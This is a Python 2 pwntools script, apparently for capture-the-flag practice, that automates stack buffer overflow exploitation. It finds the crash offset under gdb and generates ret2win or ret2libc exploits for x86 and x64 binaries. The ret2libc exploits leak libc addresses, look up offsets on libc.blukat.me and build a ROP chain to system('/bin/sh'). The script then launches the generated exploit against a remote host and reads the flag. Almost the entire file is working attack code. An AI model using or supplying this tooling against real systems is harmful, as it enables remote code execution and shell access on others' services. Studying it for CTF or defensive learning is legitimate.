#!/usr/bin/python2
from termcolor import colored
import argparse
import termcolor
from pwn import *
import os
import sys
import argparse

chall_path = os.getcwd()
os.chdir(chall_path)

def generate_ret2win(offset, chall, host, port):
    exploit = subprocess.check_output(['pwn', 'template', '--host=' + str(host), '--port=' + str(port), '--quiet', './' + str(chall)])
    return exploit

def unhex_invert(pattern , byte):
    pattern = pattern.replace("0x", "")
    #pattern = pattern.decode('hex')[::-1]
    pattern_offset = cyclic_find(pattern, n=byte)
    return pattern, pattern_offset

NORMAL = '(gdb) '

def execute(command):
    io.sendlineafter(NORMAL,command)

autopwn_scripts_path = "/home/init0/autopwn_scripts/"

parser = argparse.ArgumentParser()
parser.add_argument("-f", "--chall", type=str, default="./chall", help="challenge file", action="store")
parser.add_argument("-e", "--exp_type", type=str, default="ret2win",  help="type of exploit", action="store")
parser.add_argument("-a", "--arch", type=str, default="test.zip", help="arch (x86/x64)", action="store")
parser.add_argument("-s", "--sym", type=str, default="flag",  help="sym to return", action="store")
parser.add_argument("-x", "--hex", type=str, default="0xdeadbeef", help="address to return", action="store")
parser.add_argument("-r", "--host", type=str, default="0.0.0.0", help="host address", action="store")
parser.add_argument("-p", "--port", type=int, default="1337", help="port address", action="store")
parser.add_argument("-c", "--copy", help="copy template", action='store_true')
args = parser.parse_args()
chall = args.chall
exp_type = args.exp_type
arch = args.arch
ret2what_sym = args.sym
ret2what_addr = args.hex
host = args.host
port = args.port
copy = args.copy

if copy == True:
    offset = 32
    exploit = generate_ret2win(offset, chall, host, port)
    exploit = exploit.split("\n")
    exploit[0] = "#!/usr/bin/python2"
    exploit[3] = exploit[3] + "\n" + "context.terminal = ['alacritty', '-e', 'sh', '-c']"
    exploit[(exploit.index("gdbscript = '''"))] = "gdbscript = '''" + "\n" + "init-pwndbg"
    exploit = ('\n'.join(exploit))
    f=open('expl.py', 'w').write(exploit)

if arch == "x86" or arch == "x32":
    padding = cyclic(2000, n=4)
    io = process('/usr/bin/gdb')
    execute('file ./%s' % str(chall))
    execute('r')
    io.recv(timeout=2)
    io.sendline(padding)
    io.recvuntil("Program received signal SIGSEGV, Segmentation fault.\n")
    addr = io.recvline().split(" ")[0]
    execute("p/x $eip")
    io.recvuntil("= ")
    eip = str(io.recvline().strip())
    execute("p/x $ebp")
    io.recvuntil("= ")
    ebp = str(io.recvline().strip())
    try:
        offset = (cyclic_find(int(eip, 16), n=4))
        junk = eip[2:].decode('hex')
        log.info("EIP    ==> %s " % str(eip))
        log.info("OFFSET ==> %s " % str(offset))
        io.close()
    except:
        offset = (cyclic_find(int(ebp, 16), n=4))
        log.info("EBP    ==> %s " % str(ebp))
        log.info("OFFSET ==> %s " % int(offset + 8))
        io.close()

    if exp_type == "ret2win":
        exploit = generate_ret2win(offset, chall, host, port)
        exploit = exploit.split("\n")
        exploit[0] = "#!/usr/bin/python2"
        exploit[3] = exploit[3] + "\n" + "context.terminal = ['alacritty', '-e', 'sh', '-c']"
        exploit[(exploit.index("gdbscript = '''"))] = "gdbscript = '''" + "\n" + "init-pwndbg"
        if ret2what_addr != "0xdeadbeef":
            exploit[(exploit.index("io = start()") + 1)] = "offset = {0}\npadding = '{1}'\npayload = padding + p32({2})\nio.recv(timeout=2)\nio.sendline(payload)\ntry:\n    print(io.recv(timeout=2))\nexcept:\n    pass\n".format(offset, "A"*offset, ret2what_addr)
        else:
            exploit[(exploit.index("io = start()") + 1)] = "offset = {0}\npadding = '{1}'\npayload = padding + p32(exe.sym['{2}'])\nio.recv(timeout=2)\nio.sendline(payload)\ntry:\n    print(io.recv(timeout=2))\nexcept:\n    pass\n".format(offset, "A"*offset, ret2what_sym)

        exploit = ('\n'.join(exploit))
        f=open('expl.py', 'w').write(exploit)
        os.system("chmod +x expl.py; ./expl.py REMOTE DEBUG")
    elif exp_type == "ret2libc":
        exploit = generate_ret2win(offset, chall, host, port)
        exploit = exploit.split("\n")
        exploit[0] = "#!/usr/bin/python2\nfrom LibcSearcher import *\nimport requests\nimport re\n"
        exploit[3] = exploit[3] + "\n" + "context.terminal = ['alacritty', '-e', 'sh', '-c']"
        exploit[(exploit.index("gdbscript = '''"))] = "gdbscript = '''" + "\n" + "init-pwndbg"
        #payload = "\noffset = {0}\npadding = '{1}'\n\nrop = flat([\n    padding,\n    exe.plt['puts'],\n    exe.sym['main'],\n    exe.got['__libc_start_main']\n])\nio.recv(timeout=2)\n#gdb.attach(io, gdbscript)\nio.sendline(rop)\nleak = u32(io.recvn(4))\nlog.info('leak :  ' + hex(leak))\nobj = LibcSearcher('__libc_start_main', leak)\nlibc_base = leak - obj.dump('__libc_start_main')\nsystem = libc_base + obj.dump('system')        #system \nbinsh = libc_base + obj.dump('str_bin_sh')    #/bin/sh\nrop = flat([\n    padding,\n    system,\n    0xdeadbeef,\n    binsh\n])\nio.recv(timeout=2)\nio.sendline(rop)".format(offset, "A"*offset, ret2what_sym)
        payload = """
def leak_libc(payload):
    io.sendline(payload)
    leak=io.recvline()
    leak = leak.strip("\\n")
    leak = leak.strip("A")
    leak = u32(leak[:4])
    return leak
 
def craft_payload(leak_addr):
    rop = flat([
        padding,
        exe.plt['puts'],
        exe.sym['main'],
        exe.got[leak_addr]
    ])
    return rop

def determine_libc(leak_sym_name, leak_sym_addr):

    r = requests.Session()
    ape = r.get('https://libc.blukat.me/?q={0}:{1},{2}:{3},{4}:{5}'.format(leak_sym_name[0], hex(leak_sym_addr[0]), leak_sym_name[1], hex(leak_sym_addr[1]), leak_sym_name[2], hex(leak_sym_addr[2])))
    if 'Not found. Sorry!' in ape.text: exit(0)
    ape = ape.text.split('\\n')
    libc_version = ape[112].strip(' ')
    log.info('Libc version      :  %s'  % str(libc_version))
    return libc_version

def get_libc_offset(libc_version, libc_sym):
    global libc_sym_db
    r = requests.Session()
    libc_sym_db = r.get('https://libc.blukat.me/d/%s.symbols' % str(libc_version)).text
    offset = int('0x' + re.search(r'\\b%s ([0-9a-fA-F]+)' % str(libc_sym), libc_sym_db).group(0).split(' ')[1], 16)
    return offset

# START
offset = OFFSET
padding = 'PADDING'

#LEAK LIBC ADDRESS
alarm_leak              = leak_libc(craft_payload('alarm'))
puts_leak               = leak_libc(craft_payload('puts'))
__libc_start_main_leak  = leak_libc(craft_payload('__libc_start_main'))
log.info('__libc_start_main :  ' + hex(__libc_start_main_leak))
log.info('puts              :  ' + hex(puts_leak))
log.info('alarm             :  ' + hex(alarm_leak))
libc = False
# IDENTIFY LIBC AND ITS 0FFSET
if not libc:
    libc_version = determine_libc(['alarm', 'puts', '__libc_start_main'], [alarm_leak, puts_leak, __libc_start_main_leak])
    libc_base    = __libc_start_main_leak - get_libc_offset(libc_version, '__libc_start_main')
    system       = libc_base + get_libc_offset(libc_version, 'system')
    binsh        = libc_base + get_libc_offset(libc_version, 'str_bin_sh')
    log.info('libc base         :  ' + hex(libc_base))
else:
    libc_base = __libc_start_main_leak - libc.sym['__libc_start_main']
    system       = libc_base + libc.sym['system']
    binsh        = libc_base + next(libc.search("/bin/sh"))
    log.info('libc base         :  ' + hex(libc_base))
 
 
# FINAL EXPLOIT
io.recv(timeout=2)
rop = flat([
 
    padding,
    system,
    0xdeadbeef,
    binsh
 
])
 
io.sendline(rop)
io.sendline("cat fla*")"""
        payload = str(payload)
        #payload = payload.replace("\/", "\\")
        payload = payload.replace("OFFSET", str(offset))
        payload = payload.replace("PADDING", str('A' * offset))
        exploit[(exploit.index("io = start()") + 1)] = payload
        exploit = ('\n'.join(exploit))
        f=open('expl.py', 'w').write(exploit)
        os.system("chmod +x expl.py; ./expl.py REMOTE DEBUG")

elif arch == "x64":
    padding = cyclic(2000, n=8)
    io = process('/usr/bin/gdb')
    context.log_level='DEBUG'
    execute('file ./%s' % str(chall))
    execute('r')
    io.recv(timeout=2)
    io.sendline(padding)
    print(io.recv())
    execute("p/x $rip")
    io.recvuntil("= ")
    rip = str(io.recvline().strip())
    execute("p/x $rbp")
    io.recvuntil("= ")
    rbp = str(io.recvline().strip())
    try:
        offset = (cyclic_find(int(rip, 16), n=8))
        junk = rip[2:].decode('hex')
        log.info("RIP    ==> %s " % str(rip))
        log.info("OFFSET ==> %s " % str(offset))
        io.close()
    except:
        offset = (cyclic_find(int(rbp, 16), n=8))
        log.info("RBP    ==> %s " % str(rbp))
        log.info("OFFSET ==> %s " % int(offset + 8))

        io.close()
    if exp_type == "ret2win":
        exploit = generate_ret2win(offset, chall, host, port)
        exploit = exploit.split("\n")
        exploit[0] = "#!/usr/bin/python2"
        exploit[3] = exploit[3] + "\n" + "context.terminal = ['alacritty', '-e', 'sh', '-c']"
        exploit[(exploit.index("gdbscript = '''"))] = "gdbscript = '''" + "\n" + "init-pwndbg"
        if ret2what_addr != "0xdeadbeef":
            exploit[(exploit.index("io = start()") + 1)] = "offset = {0}\npadding = '{1}'\npayload = padding + p64({2})\nio.recv(timeout=2)\nio.sendline(payload)\ntry:\n    print(io.recv(timeout=2))\nexcept:\n    pass\n".format(offset, "A"*offset, ret2what_addr)
        else:
            exploit[(exploit.index("io = start()") + 1)] = "offset = {0}\npadding = '{1}'\npayload = padding + p64(exe.sym['{2}'])\nio.recv(timeout=2)\nio.sendline(payload)\ntry:\n    print(io.recv(timeout=2))\nexcept:\n    pass\n".format(offset, "A"*offset, ret2what_sym)

        exploit = ('\n'.join(exploit))
        f=open('expl.py', 'w').write(exploit)
        os.system("chmod +x expl.py; ./expl.py REMOTE DEBUG")
    elif exp_type == "ret2libc":
        exploit = generate_ret2win(offset, chall, host, port)
        exploit = exploit.split("\n")
        exploit[0] = "#!/usr/bin/python2\nfrom LibcSearcher import *\nimport requests\nimport re\n"
        exploit[3] = exploit[3] + "\n" + "context.terminal = ['alacritty', '-e', 'sh', '-c']"
        exploit[(exploit.index("gdbscript = '''"))] = "gdbscript = '''" + "\n" + "init-pwndbg"
        #payload = "\noffset = {0}\npadding = '{1}'\n\nrop = flat([\n    padding,\n    exe.plt['puts'],\n    exe.sym['main'],\n    exe.got['__libc_start_main']\n])\nio.recv(timeout=2)\n#gdb.attach(io, gdbscript)\nio.sendline(rop)\nleak = u32(io.recvn(4))\nlog.info('leak :  ' + hex(leak))\nobj = LibcSearcher('__libc_start_main', leak)\nlibc_base = leak - obj.dump('__libc_start_main')\nsystem = libc_base + obj.dump('system')        #system \nbinsh = libc_base + obj.dump('str_bin_sh')    #/bin/sh\nrop = flat([\n    padding,\n    system,\n    0xdeadbeef,\n    binsh\n])\nio.recv(timeout=2)\nio.sendline(rop)".format(offset, "A"*offset, ret2what_sym)
        payload = """
def leak_libc(payload):
    io.sendline(payload)
    leak=io.recvline()
    leak = leak.strip("\\n")
    leak = leak.strip("A")
    leak = u64(leak[:8].ljust(8, "\\x00"))
    return leak
 
def craft_payload(leak_addr):
    rop = flat([
        padding,
        ret,
        pop_rdi,
        exe.got[leak_addr],
        exe.plt['puts'],
        exe.sym['main'],
    ])
    return rop

def determine_libc(leak_sym_name, leak_sym_addr):

    r = requests.Session()
    ape = r.get('https://libc.blukat.me/?q={0}:{1},{2}:{3},{4}:{5}'.format(leak_sym_name[0], hex(leak_sym_addr[0]), leak_sym_name[1], hex(leak_sym_addr[1]), leak_sym_name[2], hex(leak_sym_addr[2])))
    if 'Not found. Sorry!' in ape.text: exit(0)
    ape = ape.text.split('\\n')
    libc_version = ape[112].strip(' ')
    log.info('Libc version      :  %s'  % str(libc_version))
    return libc_version

def get_libc_offset(libc_version, libc_sym):
    global libc_sym_db
    r = requests.Session()
    libc_sym_db = r.get('https://libc.blukat.me/d/%s.symbols' % str(libc_version)).text
    offset = int('0x' + re.search(r'\\b%s ([0-9a-fA-F]+)' % str(libc_sym), libc_sym_db).group(0).split(' ')[1], 16)
    return offset

# START
offset = OFFSET
padding = 'PADDING'

pop_rdi = exe.search(asm('pop rdi; ret')).next()
bss = exe.get_section_by_name('.bss')["sh_addr"]+1200
ret = exe.search(asm('ret')).next()

#LEAK LIBC ADDRESS
alarm_leak              = leak_libc(craft_payload('alarm'))
puts_leak               = leak_libc(craft_payload('puts'))
__libc_start_main_leak  = leak_libc(craft_payload('__libc_start_main'))
log.info('__libc_start_main :  ' + hex(__libc_start_main_leak))
log.info('puts              :  ' + hex(puts_leak))
log.info('alarm             :  ' + hex(alarm_leak))
libc = False
# IDENTIFY LIBC AND ITS 0FFSET
if not libc:
    libc_version = determine_libc(['alarm', 'puts', '__libc_start_main'], [alarm_leak, puts_leak, __libc_start_main_leak])
    libc_base    = __libc_start_main_leak - get_libc_offset(libc_version, '__libc_start_main')
    system       = libc_base + get_libc_offset(libc_version, 'system')
    binsh        = libc_base + get_libc_offset(libc_version, 'str_bin_sh')
    log.info('libc base         :  ' + hex(libc_base))
else:
    libc_base = __libc_start_main_leak - libc.sym['__libc_start_main']
    system       = libc_base + libc.sym['system']
    binsh        = libc_base + next(libc.search("/bin/sh"))
    log.info('libc base         :  ' + hex(libc_base))

# FINAL EXPLOIT
io.recv(timeout=2)
rop = flat([

    padding,
    ret,
    pop_rdi,
    binsh,
    system

])

io.sendline(rop)
io.sendline("cat fla*")"""
        payload = str(payload)
        #payload = payload.replace("\/", "\\")
        payload = payload.replace("OFFSET", str(offset))
        payload = payload.replace("PADDING", str('A' * offset))
        exploit[(exploit.index("io = start()") + 1)] = payload
        exploit = ('\n'.join(exploit))
        f=open('expl.py', 'w').write(exploit)
        os.system("chmod +x expl.py; ./expl.py REMOTE DEBUG")
